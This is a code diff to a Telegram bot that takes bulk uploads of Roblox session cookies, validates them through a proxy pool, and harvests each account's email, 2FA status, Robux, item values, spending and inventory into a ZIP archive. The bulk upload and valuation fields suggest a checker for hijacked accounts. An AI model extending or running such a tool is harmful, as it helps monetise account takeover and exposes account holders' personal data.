@@ -1,3 +1,5 @@
+import re
+
 from aiogram import F, types
 
 from http_shared import get_client, PROXY_POOL
@@ -50,6 +52,67 @@ LOG_DIR = pathlib.Path(os.getenv("LOG_DIR") or pathlib.Path(__file__).resolve().
 LOG_DIR.mkdir(parents=True, exist_ok=True)
 _INVLOG_PATH = LOG_DIR / "inventory.debug.log"
 _CHECKLOG_PATH = LOG_DIR / "checks.log"
+
+
+# ======================= ARCHIVE SAVE HELPERS =======================
+
+def _fs_safe(s: str, *, max_len: int = 40) -> str:
+    """Make a filename-safe string."""
+    s = (s or "").strip()
+    s = re.sub(r"\s+", "_", s)
+    s = re.sub(r"[^A-Za-z0-9_.-]", "", s)
+    s = s.strip("._-")
+    if not s:
+        return "user"
+    return s[:max_len]
+
+
+def _ensure_dir(path: str) -> None:
+    try:
+        os.makedirs(path, exist_ok=True)
+    except Exception:
+        pass
+
+
+def _write_text(path: str, content: str) -> None:
+    try:
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(content or "")
+    except Exception:
+        pass
+
+
+def _write_bytes(path: str, content: bytes) -> None:
+    try:
+        with open(path, "wb") as f:
+            f.write(content or b"")
+    except Exception:
+        pass
+
+
+async def _download_to_file(url: str, path: str, *, timeout_s: float = 12.0) -> bool:
+    if not url:
+        return False
+    try:
+        async with httpx.AsyncClient(timeout=timeout_s, follow_redirects=True) as c:
+            r = await c.get(url)
+            if r.status_code == 200 and r.content:
+                _write_bytes(path, r.content)
+                return True
+    except Exception:
+        return False
+    return False
+
+
+def _zip_dir(src_dir: str, zip_path: str) -> None:
+    """Zip src_dir into zip_path (includes the top folder)."""
+    base = os.path.basename(src_dir.rstrip("/\\"))
+    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as z:
+        for root, dirs, files in os.walk(src_dir):
+            for fn in files:
+                fp = os.path.join(root, fn)
+                rel = os.path.relpath(fp, src_dir)
+                z.write(fp, arcname=os.path.join(base, rel))
 
 
 def _checklog(event: str, tg_id: int | None = None, roblox_id: int | None = None,
@@ -107,9 +170,6 @@ async def _log_check(tg_id: int, roblox_id: int | None, scope: str, what: str, e
     except Exception:
         # падать здесь нельзя, лог просто пропускаем
         pass
-
-
-
 
 
 def _invlog(event: str, **kw):
@@ -269,7 +329,6 @@ class LangMiddleware(BaseMiddleware):
                 current_lang = _CURRENT_LANG.get()
                 stored_lang = await get_user_lang(storage, user.id, fallback='en')
                 if current_lang != stored_lang:
-
                     _CURRENT_LANG.set(stored_lang)
                     set_current_lang(stored_lang)
             except Exception as e:
@@ -443,6 +502,7 @@ class PublicPendingFilter(BaseFilter):
         except Exception:
             return False
 
+
 def L(key: str, **kw) -> str:
     lang = _CURRENT_LANG.get() or 'en'
     try:
@@ -474,6 +534,15 @@ def LL(*keys, **kw) -> str:
         return last
 
 
+def _safe_i18n_label(key: str, fallback: str) -> str:
+    """Return localized label if available, otherwise fallback."""
+    try:
+        val = L(key)
+    except Exception:
+        val = key
+    return val if (val and val != key) else fallback
+
+
 def _mask_email(email: str) -> str:
     return email
 
@@ -482,7 +551,6 @@ def render_profile_text_i18n(*, uname, dname, roblox_id, created, country, gende
                              email_verified, email_2fa=False, robux, spent_val, banned) -> str:
     # ДЕБАГ
     current_lang = _CURRENT_LANG.get()
-
 
     # Map raw gender text like "👨 Мужской" / "👩 Женский" to common keys
     gkey = 'unknown'
@@ -528,7 +596,6 @@ def render_profile_text_i18n(*, uname, dname, roblox_id, created, country, gende
                  spent=(
                      f"{spent_val} R$" if isinstance(spent_val, (int, float)) and spent_val >= 0 else L('common.dash')),
                  status=L(f'common.{skey}'))
-
 
     return text
 
@@ -698,6 +765,7 @@ async def validate_and_clean_cookie(cookie_value: str) -> Tuple[bool, Optional[s
         logger.error(f'{L("errors.generic", err=str(e))}')
         return (False, None, None)
 
+
 async def _cookie_alive(cookie: str) -> bool:
     try:
         import httpx
@@ -708,7 +776,6 @@ async def _cookie_alive(cookie: str) -> bool:
             return r.status_code == 200
     except Exception:
         return False
-
 
 
 async def edit_or_send(message: types.Message, text: str, reply_markup: Optional[InlineKeyboardMarkup] = None,
@@ -854,6 +921,7 @@ def kb_navigation(roblox_id: int) -> InlineKeyboardMarkup:
         ],
     ])
 
+
 def kb_public_navigation(roblox_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [
@@ -895,6 +963,7 @@ def kb_public_navigation(roblox_id: int) -> InlineKeyboardMarkup:
             )
         ],
     ])
+
 
 def _kb_category_footer(roblox_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -1183,6 +1252,11 @@ async def handle_txt_upload(message: types.Message) -> None:
         await edit_or_send(message, L("status.file_empty"), reply_markup=await kb_main_i18n(tg))
         return
 
+    # 📦 Add Accounts archive root (per upload)
+    run_id = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    base_dir = os.path.join("temp", f"add_accounts_{tg}_{run_id}")
+    os.makedirs(base_dir, exist_ok=True)
+
     # --- retry policy ---
     RETRYABLE_STATUSES = {408, 425, 429, 500, 502, 503, 504}
     RETRYABLE_EXC = (
@@ -1203,13 +1277,15 @@ async def handle_txt_upload(message: types.Message) -> None:
                 return True
         return False
 
-    async def _safe_get(c: httpx.AsyncClient, url: str, headers: dict, *, timeout_s: float = 6.0) -> Optional[httpx.Response]:
+    async def _safe_get(c: httpx.AsyncClient, url: str, headers: dict, *, timeout_s: float = 6.0) -> Optional[
+        httpx.Response]:
         try:
             return await asyncio.wait_for(c.get(url, headers=headers), timeout=timeout_s)
         except Exception:
             return None
 
-    async def _build_profile_card_fast(cookie_plain: str, rid: int, proxy: Optional[str], user_data: dict) -> tuple[str, Optional[str]]:
+    async def _build_profile_card_fast(cookie_plain: str, rid: int, proxy: Optional[str], user_data: dict) -> tuple[
+        str, Optional[str]]:
         """
         Быстрая сборка карточки:
         - обязательные поля берём из user_data (уже проверено validate_and_clean_cookie)
@@ -1228,12 +1304,13 @@ async def handle_txt_upload(message: types.Message) -> None:
         banned = bool((user_data or {}).get("isBanned", False))
 
         # параллельные запросы (каждый best-effort)
-        t_country = _safe_get(c, "https://accountsettings.roblox.com/v1/account/settings/account-country", headers, timeout_s=5.0)
-        t_email   = _safe_get(c, "https://accountsettings.roblox.com/v1/email", headers, timeout_s=5.0)
-        t_gender  = _safe_get(c, "https://accountinformation.roblox.com/v1/gender", headers, timeout_s=5.0)
-        t_bdate   = _safe_get(c, "https://accountinformation.roblox.com/v1/birthdate", headers, timeout_s=5.0)
-        t_robux   = _safe_get(c, "https://economy.roblox.com/v1/user/currency", headers, timeout_s=5.0)
-        t_thumb   = _safe_get(
+        t_country = _safe_get(c, "https://accountsettings.roblox.com/v1/account/settings/account-country", headers,
+                              timeout_s=5.0)
+        t_email = _safe_get(c, "https://accountsettings.roblox.com/v1/email", headers, timeout_s=5.0)
+        t_gender = _safe_get(c, "https://accountinformation.roblox.com/v1/gender", headers, timeout_s=5.0)
+        t_bdate = _safe_get(c, "https://accountinformation.roblox.com/v1/birthdate", headers, timeout_s=5.0)
+        t_robux = _safe_get(c, "https://economy.roblox.com/v1/user/currency", headers, timeout_s=5.0)
+        t_thumb = _safe_get(
             c,
             f"https://thumbnails.roblox.com/v1/users/avatar?userIds={rid}&size=420x420&format=Png&isCircular=false",
             {"User-Agent": "Mozilla/5.0"},
@@ -1322,11 +1399,13 @@ async def handle_txt_upload(message: types.Message) -> None:
         )
         return text, avatar_url
 
-    async def _send_profile_card_fast(rid: int, uname: str, cookie_plain: str, user_data: dict):
+    async def _send_profile_card_fast(rid: int, uname: str, cookie_plain: str, user_data: dict,
+                                      save_dir: str | None = None):
         """
         Ретраи по прокси, но внутри одной попытки — всё максимально параллельно.
         Плюс: фотку не качаем, отдаём URL (самое быстрое).
         """
+        tg_username = (getattr(message.from_user, "username", None) or f"user{tg}")
         max_retries = 2
 
         last_err: Optional[Exception] = None
@@ -1335,6 +1414,13 @@ async def handle_txt_upload(message: types.Message) -> None:
             try:
                 text, avatar_url = await _build_profile_card_fast(cookie_plain, rid, proxy, user_data)
 
+                # save exactly what we send (for Add Accounts ZIP)
+                if save_dir:
+                    _ensure_dir(save_dir)
+                    _write_text(os.path.join(save_dir, "01_Profile.txt"), text)
+                    # download avatar to file (no need to keep URL)
+                    if avatar_url:
+                        await _download_to_file(avatar_url, os.path.join(save_dir, "01_Avatar.png"))
                 if avatar_url:
                     # ⚡️ главная оптимизация: не скачиваем bytes, просто отдаём URL
                     await message.answer_photo(avatar_url, caption=text, reply_markup=kb_navigation(rid))
@@ -1386,6 +1472,10 @@ async def handle_txt_upload(message: types.Message) -> None:
         rid = int(user_data["id"])
         uname = (user_data.get("name") or "").strip()
 
+        # folder per account inside this Add Accounts run
+        acc_dir = os.path.join(base_dir, f"{rid}_{_fs_safe(uname) if uname else 'user'}")
+        os.makedirs(acc_dir, exist_ok=True)
+
         enc = encrypt_text(cleaned_cookie)
         await storage.save_encrypted_cookie(tg, rid, enc)
         await storage.upsert_user(tg, rid, uname, user_data.get("created"))
@@ -1399,7 +1489,16 @@ async def handle_txt_upload(message: types.Message) -> None:
         added.append((rid, uname))
 
         # отправляем карточку сразу, без лишних sleeps
-        await _send_profile_card_fast(rid, uname, cleaned_cookie, user_data)
+        await _send_profile_card_fast(rid, uname, cleaned_cookie, user_data, save_dir=acc_dir)
+
+        # 🔁 дальше прям как будто нажали кнопки
+        await _send_rap_like_buttons(message, tg, rid, cleaned_cookie, save_dir=acc_dir)
+        await _send_offsale_like_buttons(message, tg, rid, cleaned_cookie, save_dir=acc_dir)
+        await _send_revenue_like_buttons(message, rid, cleaned_cookie, save_dir=acc_dir)
+        await _send_usernames_like_buttons(message, rid, cleaned_cookie, save_dir=acc_dir)
+        await _send_spending_like_buttons(message, tg, rid, save_dir=acc_dir)
+        await _send_favorites_like_buttons(message, tg, rid, save_dir=acc_dir)
+        await _send_full_inventory_like_buttons(message, tg, rid, cleaned_cookie, save_dir=acc_dir)
 
     if ok == 0:
         await edit_or_send(message, L("msg.no_valid_cookies"), reply_markup=await kb_main_i18n(tg))
@@ -1413,8 +1512,19 @@ async def handle_txt_upload(message: types.Message) -> None:
         ]
     )
     kb = InlineKeyboardMarkup(inline_keyboard=rows)
-    await message.answer(L("status.added_result", ok=ok, bad=bad), reply_markup=kb)
 
+    # 📦 build & send ZIP with everything we sent during this run
+    try:
+        zip_path = os.path.join("temp", f"add_accounts_{tg}_{run_id}.zip")
+        _zip_dir(base_dir, zip_path)
+        await message.answer_document(FSInputFile(zip_path), caption="📦 Add Accounts results")
+    except Exception as e:
+        try:
+            await message.answer(T('errors.generic', err=str(e)))
+        except Exception:
+            pass
+
+    await message.answer(L("status.added_result", ok=ok, bad=bad), reply_markup=kb)
 
 
 @router.callback_query(F.data.startswith('delacct:'))
@@ -1452,7 +1562,6 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
 
     # ---------- FAST PATH: cache first ----------
     lang = _CURRENT_LANG.get()
-
 
     rec = _profile_mem_get2(tg, roblox_id, lang)
     if isinstance(rec, dict) and rec.get("text"):
@@ -1540,7 +1649,8 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
             country = await storage.get_cached_data(roblox_id, 'acc_country_v1')
             if country is None:
                 await protect_language(call.from_user.id)
-                r = await c.get('https://accountsettings.roblox.com/v1/account/settings/account-country', headers=headers)
+                r = await c.get('https://accountsettings.roblox.com/v1/account/settings/account-country',
+                                headers=headers)
                 country = L('common.dash')
                 if r.status_code == 200:
                     v = (r.json() or {}).get('value', {})
@@ -1565,7 +1675,8 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
                     if r2.status_code == 200:
                         j2 = r2.json() or {}
                         if isinstance(j2, dict):
-                            if j2.get('twoFactorEnabled') or j2.get('twoStepVerificationEnabled') or j2.get('isTwoStepVerificationEnabled'):
+                            if j2.get('twoFactorEnabled') or j2.get('twoStepVerificationEnabled') or j2.get(
+                                    'isTwoStepVerificationEnabled'):
                                 email_2fa = True
                             else:
                                 for key in ('value', 'values', 'settings'):
@@ -1669,10 +1780,12 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
             if premium is None:
                 await protect_language(call.from_user.id)
                 premium = L('common.regular')
-                r = await c.get(f'https://premiumfeatures.roblox.com/v1/users/{roblox_id}/validate-membership', headers=headers)
+                r = await c.get(f'https://premiumfeatures.roblox.com/v1/users/{roblox_id}/validate-membership',
+                                headers=headers)
                 if r.status_code == 200:
                     pj = r.json()
-                    if (isinstance(pj, bool) and pj) or (isinstance(pj, dict) and (pj.get('isPremium') or pj.get('hasMembership') or pj.get('premium'))):
+                    if (isinstance(pj, bool) and pj) or (isinstance(pj, dict) and (
+                            pj.get('isPremium') or pj.get('hasMembership') or pj.get('premium'))):
                         premium = L('common.premium')
                 await storage.set_cached_data(roblox_id, 'acc_premium_v1', premium, 60)
 
@@ -1720,7 +1833,8 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
                     path = f'temp/avatar_{roblox_id}.png'
                     os.makedirs('temp', exist_ok=True)
                     open(path, 'wb').write(im.content)
-                    await call.message.answer_photo(FSInputFile(path), caption=text, reply_markup=kb_navigation(roblox_id))
+                    await call.message.answer_photo(FSInputFile(path), caption=text,
+                                                    reply_markup=kb_navigation(roblox_id))
                     try:
                         os.remove(path)
                     except Exception:
@@ -1743,7 +1857,6 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
             await loader.edit_text(L("err.profile_load"), reply_markup=await kb_main_i18n(tg))
         except Exception:
             pass
-
 
 
 from typing import Dict, List, Any, Tuple
@@ -1788,11 +1901,10 @@ def _short_name(roblox_id: int, name: str, max_len: int = 28) -> str:
 def _kb_categories_only(roblox_id: int, by_cat: Dict[str, List[Dict[str, Any]]]) -> InlineKeyboardMarkup:
     rows: List[List[InlineKeyboardButton]] = []
     for cat, items in sorted(by_cat.items(), key=lambda kv: kv[0].lower()):
-        nz = _filter_nonzero(items)
         if not items:
             continue
         rows.append([InlineKeyboardButton(
-            text=f'{cat} — {len(nz)} {L("common.pcs")} · {_sum_items(nz):,} {RICON}'.replace(',', ' '),
+            text=f'{cat} — {len(items)} {L("common.pcs")} · {_sum_items(items):,} {RICON}'.replace(',', ' '),
             callback_data=f'invcat:{roblox_id}:{_short_name(roblox_id, cat)}')])
     rows.append([InlineKeyboardButton(text=LL('buttons.refresh', 'btn.refresh'),
                                       callback_data=f'invall_refresh:{roblox_id}')])
@@ -1810,7 +1922,6 @@ def _likely_private_inventory(err: Exception) -> bool:
 
 def _caption_full_inventory(total_count: int, total_sum: int) -> str:
     current_lang = _CURRENT_LANG.get()
-
 
     # ПРИНУДИТЕЛЬНЫЙ РУССКИЙ ЕСЛИ НУЖНО
     if current_lang == 'ru':
@@ -1832,7 +1943,6 @@ def _caption_full_inventory(total_count: int, total_sum: int) -> str:
 def _caption_category(cat_name: str, count: int, total_sum: int) -> str:
     current_lang = _CURRENT_LANG.get()
 
-
     # ПРИНУДИТЕЛЬНЫЙ РУССКИЙ ЕСЛИ НУЖНО
     if current_lang == 'ru':
         cat_loc = cat_label(cat_name)
@@ -1850,18 +1960,16 @@ def _caption_category(cat_name: str, count: int, total_sum: int) -> str:
         return result
 
 
-
-
 INV_CAPTION_LIMIT = 200
 
 
 def _build_full_inventory_caption(
-    *,
-    total: int,
-    total_sum: int,
-    robux: int | None,
-    items: List[Dict[str, Any]],
-    max_len: int = INV_CAPTION_LIMIT,
+        *,
+        total: int,
+        total_sum: int,
+        robux: int | None,
+        items: List[Dict[str, Any]],
+        max_len: int = INV_CAPTION_LIMIT,
 ) -> str:
     """
     ОДНА строка не длиннее max_len:
@@ -1926,6 +2034,7 @@ def _build_full_inventory_caption(
                     return _price_value(it.get("priceInfo"))
                 except Exception:
                     return 0
+
             sorted_items = sorted(items or [], key=_sortkey, reverse=True)
         else:
             sorted_items = list(items or [])
@@ -2138,7 +2247,7 @@ async def cb_inventory_all_refresh(call: types.CallbackQuery) -> None:
         by_cat = _merge_categories(data.get('byCategory', {}) or {})
         all_items: List[Dict[str, Any]] = []
         for arr in by_cat.values():
-            all_items.extend(_filter_nonzero(arr))
+            all_items.extend(arr)
         img_bytes = await generate_full_inventory_grid(all_items, tile=150, pad=6, username=call.from_user.username,
                                                        user_id=call.from_user.id)
         import os
@@ -2833,7 +2942,6 @@ async def cb_inv_cfg_next(call: types.CallbackQuery):
             await call.message.answer(L('msg.auto_f3d5341cc3', e=e), parse_mode='HTML')
 
 
-
 import pathlib
 
 
@@ -2902,7 +3010,6 @@ async def on_lang_set(call: types.CallbackQuery):
         pass
     await call.message.edit_text(LL('messages.welcome', 'welcome') or 'Welcome!',
                                  reply_markup=await kb_main_i18n(call.from_user.id))
-
 
 
 async def debug_lang(context: str, user_id: int):
@@ -3156,8 +3263,6 @@ async def handle_public_id(message: types.Message) -> None:
         )
 
 
-
-
 @router.message(Command("debug_lang"))
 async def cmd_debug_lang(msg: types.Message):
     user_id = msg.from_user.id
@@ -3401,7 +3506,6 @@ async def cb_inv_pub_cfg_next(call: types.CallbackQuery):
             await loader.edit_text(L('msg.auto_f3d5341cc3', e=e), parse_mode='HTML')
         except Exception:
             await call.message.answer(L('msg.auto_f3d5341cc3', e=e), parse_mode='HTML')
-
 
 
 import pathlib
@@ -4406,10 +4510,13 @@ async def cb_favorites(call: types.CallbackQuery) -> None:
             await wait.edit_text(err)
         except:
             await call.message.answer(err)
+
+
 # ======================= /FAVORITES =======================
 # вставь в handlers.py
 from aiogram.filters import Command
 import io, csv
+
 
 @router.message(Command("export_accounts_csv"))
 async def cmd_export_accounts_csv(msg: types.Message):
@@ -4469,7 +4576,8 @@ async def cmd_export_accounts_csv(msg: types.Message):
         spending_total = ""
         if enc:
             try:
-                txs = await rbc.get_spending_history_by_encrypted_cookie(enc, rid, limit=SPENDING_LIMIT, use_cache=False)
+                txs = await rbc.get_spending_history_by_encrypted_cookie(enc, rid, limit=SPENDING_LIMIT,
+                                                                         use_cache=False)
                 total = 0
                 for tx in (txs or []):
                     try:
@@ -4501,6 +4609,7 @@ async def cmd_export_accounts_csv(msg: types.Message):
 from roblox_client import calc_user_rap, get_offsale_collectibles, get_username_history, get_revenue
 from util.crypto import decrypt_text
 
+
 def _L(key: str, **kw):
     try:
         return tr(_CURRENT_LANG.get() or 'en', key, **kw)
@@ -4510,44 +4619,354 @@ def _L(key: str, **kw):
         except Exception:
             return key
 
-# === SNAPSHOT COMMAND ===
 
-from aiogram.filters import Command
-from aiogram import types
-import storage
-@router.message(Command('snapshot_all'))
-async def cmd_snapshot_all(message: types.Message):
-    tg = message.from_user.id
-    if is_admin(tg):
+# --- Helpers to send the same output as inline кнопки (RAP/Off-sale/Revenue/Usernames/Favorites/Spending/Inventory) ---
+
+async def _send_rap_like_buttons(msg: Message, tg_id: int, rid: int, cookie: str | None, save_dir: str | None = None):
+    """Sends RAP exactly in the same style as RAP button: image + caption (+ fallback text if empty)."""
+    from aiogram.types import BufferedInputFile
+    from roblox_imagegen import generate_rap_sheet
+    import html
+
+    wait = await msg.answer(_L("rap.loading"))
+    try:
+        data = await roblox_client.calc_user_rap(rid, cookie=cookie)
+        total = int((data or {}).get("total") or 0)
+        items = (data or {}).get("items") or []
+
+        if not items:
+            # Prefer the same empty message used in UI
+            cap = _L("rap.no_items")
+            if save_dir:
+                _ensure_dir(save_dir)
+                _write_text(os.path.join(save_dir, "02_RAP.txt"), cap)
+            try:
+                await wait.edit_text(cap)
+            except Exception:
+                await msg.answer(cap)
+            return
+
+        # Build caption like in UI
+        lines = [_L("rap.total", value=total)]
+        # show top 10
+        for it in items[:10]:
+            nm = html.escape(str(it.get("name") or "—"))
+            rapv = int(it.get("rap") or 0)
+            lines.append(_L("rap.item_row", name=nm, rap=rapv))
+        cap = "\n".join(lines)
+
+        img_bytes = await generate_rap_sheet(tg_id, rid, cookie=cookie)
+        photo = BufferedInputFile(img_bytes, filename=f"rap_{rid}.png")
         try:
-            n = await storage.snapshot_all_for_user(tg, reason='manual_all')
-            if n > 0:
-                await message.answer(f'✅ Snapshots saved: {n}')
-            else:
-                await message.answer('⚠️ Nothing to snapshot.')
-        except Exception as e:
-            await message.answer(f'❌ Snapshot failed: {e}')
-@router.message(Command('snapshot_all_global'))
-async def cmd_snapshot_all_global(message: types.Message):
-    tg = message.from_user.id
-    if is_admin(tg):
-        import storage
-        users = await storage.list_all_owners()
-        total = 0
-        for uid in users:
-            n = await storage.snapshot_all_for_user(uid, reason='global_manual')
-            total += n
-        await message.answer(f'✅ Global snapshot complete.\nSaved {total} records.')
+            await wait.delete()
+        except Exception:
+            pass
 
-from io import StringIO, BytesIO
-from aiogram.types import BufferedInputFile
-from aiogram.filters import Command
+        if save_dir:
+            _ensure_dir(save_dir)
+            _write_text(os.path.join(save_dir, "02_RAP.txt"), cap)
+            _write_bytes(os.path.join(save_dir, "02_RAP.png"), img_bytes)
+        await msg.answer_photo(photo, caption=cap)
+    except Exception as e:
+        err = _L("errors.generic", err=str(e) or repr(e))
+        try:
+            await wait.edit_text(err)
+        except Exception:
+            await msg.answer(err)
+
+
+async def _send_offsale_like_buttons(msg: Message, tg_id: int, rid: int, cookie: str | None,
+                                     save_dir: str | None = None):
+    """Sends Off-sale like Off-sale button: image + caption + fallbacks."""
+    from aiogram.types import BufferedInputFile
+    from roblox_imagegen import generate_offsale_sheet
+    import html
+
+    wait = await msg.answer(_L("offsale.loading"))
+    try:
+        items = await roblox_client.get_offsale_collectibles(rid, cookie=cookie)
+        items = items or []
+        if not items:
+            cap = _L("offsale.empty")
+            if save_dir:
+                _ensure_dir(save_dir)
+                _write_text(os.path.join(save_dir, "03_Offsale.txt"), cap)
+            try:
+                await wait.edit_text(cap)
+            except Exception:
+                await msg.answer(cap)
+            return
+
+        lines = [_L("offsale.title")]
+        for it in items[:10]:
+            nm = html.escape(str(it.get("name") or "—"))
+            rapv = int(it.get("rap") or 0)
+            lines.append(_L("offsale.row_collectible", name=nm, rap=rapv))
+        cap = "\n".join(lines)
+
+        img_bytes = await generate_offsale_sheet(tg_id, rid, cookie=cookie)
+        photo = BufferedInputFile(img_bytes, filename=f"offsale_{rid}.png")
+        try:
+            await wait.delete()
+        except Exception:
+            pass
+
+        if save_dir:
+            _ensure_dir(save_dir)
+            _write_text(os.path.join(save_dir, "03_Offsale.txt"), cap)
+            _write_bytes(os.path.join(save_dir, "03_Offsale.png"), img_bytes)
+        await msg.answer_photo(photo, caption=cap)
+    except Exception as e:
+        err = _L("errors.generic", err=str(e) or repr(e))
+        try:
+            await wait.edit_text(err)
+        except Exception:
+            await msg.answer(err)
+
+
+async def _send_revenue_like_buttons(msg: Message, rid: int, cookie: str | None, save_dir: str | None = None):
+    """Sends Revenue like button: uses roblox_client.get_revenue signature (no cursor)."""
+    import html
+    wait = await msg.answer(_L("revenue.loading"))
+    try:
+        if not cookie:
+            cap = _L("revenue.auth_required")
+            if save_dir:
+                _ensure_dir(save_dir)
+                _write_text(os.path.join(save_dir, "04_Revenue.txt"), cap)
+            try:
+                await wait.edit_text(cap)
+            except Exception:
+                await msg.answer(cap)
+            return
+
+        data = await roblox_client.get_revenue(rid, cookie, limit=1000)
+        items = (data or {}).get("items") or []
+        total_sum = int((data or {}).get("total") or 0)
+
+        if not items:
+            cap = _L("revenue.empty")
+            if save_dir:
+                _ensure_dir(save_dir)
+                _write_text(os.path.join(save_dir, "04_Revenue.txt"), cap)
+            try:
+                await wait.edit_text(cap)
+            except Exception:
+                await msg.answer(cap)
+            return
+
+        lines = [_L("revenue.summary", sum=total_sum)]
+        for tx in items[:15]:
+            date = html.escape(str((tx.get("created") or tx.get("date") or "")).replace("T", " ")[:19])
+            typ = html.escape(str(tx.get("type") or tx.get("transactionType") or "—"))
+            amt = int(((tx.get("currency") or {}).get("amount")) or tx.get("amount") or 0)
+            src = html.escape(str(tx.get("source") or tx.get("details") or tx.get("description") or "—"))
+            lines.append(_L("revenue.row", date=date, type=typ, amount=amt, source=src))
+        cap = "\n".join(lines)
+
+        if save_dir:
+            _ensure_dir(save_dir)
+            _write_text(os.path.join(save_dir, "04_Revenue.txt"), cap)
+        try:
+            await wait.edit_text(cap)
+        except Exception:
+            await msg.answer(cap)
+    except Exception as e:
+        err = _L("errors.generic", err=str(e) or repr(e))
+        try:
+            await wait.edit_text(err)
+        except Exception:
+            await msg.answer(err)
+
+
+async def _send_usernames_like_buttons(msg: Message, rid: int, cookie: str | None, save_dir: str | None = None):
+    """Sends past usernames like button: uses roblox_client.get_username_history (public, no cookie)."""
+    import html
+    wait = await msg.answer(_L("usernames.loading"))
+    try:
+        arr = await roblox_client.get_username_history(rid, limit=100)
+        arr = arr or []
+        if not arr:
+            cap = _L("usernames.empty")
+            if save_dir:
+                _ensure_dir(save_dir)
+                _write_text(os.path.join(save_dir, "05_PastUsernames.txt"), cap)
+            try:
+                await wait.edit_text(cap)
+            except Exception:
+                await msg.answer(cap)
+            return
+        lines = [_L("usernames.title")]
+        for it in arr[:15]:
+            name = html.escape(str(it.get("name") or it.get("username") or "—"))
+            changed = html.escape(
+                str(it.get("created") or it.get("changedAt") or it.get("date") or "")[:19].replace("T", " "))
+            lines.append(_L("usernames.row", name=name, changedAt=changed))
+        cap = "\n".join(lines)
+
+        if save_dir:
+            _ensure_dir(save_dir)
+            _write_text(os.path.join(save_dir, "05_PastUsernames.txt"), cap)
+        try:
+            await wait.edit_text(cap)
+        except Exception:
+            await msg.answer(cap)
+    except Exception as e:
+        err = _L("errors.generic", err=str(e) or repr(e))
+        try:
+            await wait.edit_text(err)
+        except Exception:
+            await msg.answer(err)
+
+
+async def _send_spending_like_buttons(msg: Message, tg_id: int, rid: int, save_dir: str | None = None):
+    """Sends Spending exactly like the Spending button: same loading, same header, same keyboard."""
+    wait = await msg.answer(T('spending.loading'))
+    try:
+        rec = _sp_mem_get(tg_id, rid)
+        if not rec:
+            rows = await _sp_fetch_rows(tg_id, rid, 500)
+            places, items_by_place, grand = _sp_group(rows)
+            _sp_mem_set(tg_id, rid, places, items_by_place, grand)
+            rec = _sp_mem_get(tg_id, rid) or {'places': places, 'items': items_by_place, 'total_sum': grand}
+
+        kb = _sp_kb_places(rid, rec.get('places', []), page=0)
+        header = T('spending.header', sum=rec.get('total_sum', 0))
+
+        if save_dir:
+            _ensure_dir(save_dir)
+            _write_text(os.path.join(save_dir, "06_Spending.txt"), header)
+        try:
+            await wait.edit_text(header, reply_markup=kb)
+        except Exception:
+            await msg.answer(header, reply_markup=kb)
+    except Exception as e:
+        logger.error(f"_send_spending_like_buttons failed: {e!r}")
+        try:
+            await wait.edit_text(T('errors.generic', err=str(e)))
+        except Exception:
+            await msg.answer(T('errors.generic', err=str(e)))
+
+
+async def _send_favorites_like_buttons(msg: Message, tg_id: int, rid: int, save_dir: str | None = None):
+    """Sends favorites first page exactly like Favorites button."""
+    wait = await msg.answer(L('games.loading') if LL('games.loading', '') else L('common.ellipsis'))
+    try:
+        items = await _fetch_favorites(tg_id, rid)
+        text, total = _fav_page_lines(items, 0)
+        kb = _fav_kb(rid, 0, total)
+
+        if save_dir:
+            _ensure_dir(save_dir)
+            _write_text(os.path.join(save_dir, "07_Favorites.txt"), text)
+        try:
+            await wait.edit_text(text, reply_markup=kb, disable_web_page_preview=True)
+        except Exception:
+            await msg.answer(text, reply_markup=kb, disable_web_page_preview=True)
+    except Exception as e:
+        err = _L("errors.generic", err=str(e) or repr(e))
+        try:
+            await wait.edit_text(err)
+        except Exception:
+            await msg.answer(err)
+
+
+async def _send_full_inventory_like_buttons(msg: Message, tg_id: int, rid: int, cookie: str | None,
+                                            save_dir: str | None = None):
+    """Sends full inventory images like the Full inventory button (same generator + paging)."""
+    import os, io
+    from aiogram.types import BufferedInputFile
+    from roblox_imagegen import generate_full_inventory_grids, tr, get_current_lang
+    from PIL import Image
+
+    wait = await msg.answer(L('inv.loading_full') if LL('inv.loading_full', '') else L('common.ellipsis'))
+    try:
+        if not cookie:
+            cap = L('inv.private_requires_cookie') if LL('inv.private_requires_cookie', '') else L('common.na')
+            if save_dir:
+                _ensure_dir(save_dir)
+                _write_text(os.path.join(save_dir, "08_Inventory.txt"), cap)
+            try:
+                await wait.edit_text(cap)
+            except Exception:
+                await msg.answer(cap)
+            return
+
+        inv = await roblox_client.get_full_inventory_with_cookie(rid, cookie=cookie)
+        by_cat = {}
+        if isinstance(inv, dict):
+            by_cat = inv.get("byCategory", {}) or {}
+        by_cat = _merge_categories(by_cat)
+        all_items: list = []
+        for arr in (by_cat or {}).values():
+            if arr:
+                all_items.extend(arr)
+
+        if not all_items:
+            cap = L('inv.empty') if LL('inv.empty', '') else L('common.na')
+            if save_dir:
+                _ensure_dir(save_dir)
+                _write_text(os.path.join(save_dir, "08_Inventory.txt"), cap)
+            try:
+                await wait.edit_text(cap)
+            except Exception:
+                await msg.answer(cap)
+            return
+
+        cap_env = os.getenv("MAX_ITEMS_PER_IMAGE", "650")
+        try:
+            cap_n = max(1, int(cap_env))
+        except Exception:
+            cap_n = 650
+
+        lang = get_current_lang()
+        pages = await generate_full_inventory_grids(
+            all_items,
+            tile=int(os.getenv("INVENTORY_TILE", "150")),
+            username=(msg.from_user.username or f"id{tg_id}"),
+            user_id=tg_id,
+            title=tr(lang, 'inventory.full_title'),
+            max_items_per_image=cap_n
+        )
+
+        try:
+            await wait.delete()
+        except Exception:
+            pass
+
+        total_pages = len(pages) or 1
+        caption_prefix = ""
+        try:
+            caption_prefix = _build_full_inventory_caption(len(all_items))
+        except Exception:
+            caption_prefix = L('inventory_view.all_title', count=len(all_items), total_sum=_sum_items(all_items)) if LL(
+                'inventory_view.all_title', '') else f"Full inventory: {len(all_items)}"
+
+        for i, img_bytes in enumerate(pages, 1):
